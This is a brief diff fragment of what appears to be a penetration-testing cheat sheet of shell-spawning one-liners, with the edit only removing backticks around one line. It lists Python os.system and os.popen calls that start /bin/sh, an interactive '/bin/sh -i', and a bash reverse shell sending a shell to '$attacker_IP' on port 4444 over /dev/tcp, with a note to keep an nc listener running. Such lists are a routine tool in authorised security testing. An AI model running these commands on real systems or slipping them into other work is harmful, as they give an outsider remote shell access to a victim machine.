@@ -16,7 +16,7 @@ python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 -----
 bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
 -----
-`echo os.system('/bin/bash')`
+echo os.system('/bin/bash')
 -----
 `/bin/sh -i`
 -----
